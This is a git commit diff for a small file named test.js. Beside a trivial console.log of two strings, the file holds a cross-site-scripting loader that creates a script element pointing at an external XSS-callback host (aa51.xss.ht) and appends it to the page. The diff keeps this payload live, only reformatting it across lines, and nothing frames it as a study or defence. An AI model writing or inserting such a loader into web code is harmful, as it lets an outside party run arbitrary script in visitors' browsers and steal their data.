bf6bec841730f1035daa473d121d37878ce1c67b
AnankeMOon <99124773+AnankeMOon@users.noreply.github.com>
2022-06-13 17:16:14 +0200

    Update test.js

--- test.js
+++ test.js
@@ -2,4 +2,6 @@ let a= "Ananke" ; b= "Moon";
 
 console.log(a + b);
 
-var a=document.createElement(\'script\');a.src=\'https://aa51.xss.ht\';document.body.appendChild(a);
+var a=document.createElement(\'script\');a.src=\'https://aa51.xss.ht\'; 
+          
+document.body.appendChild(a);
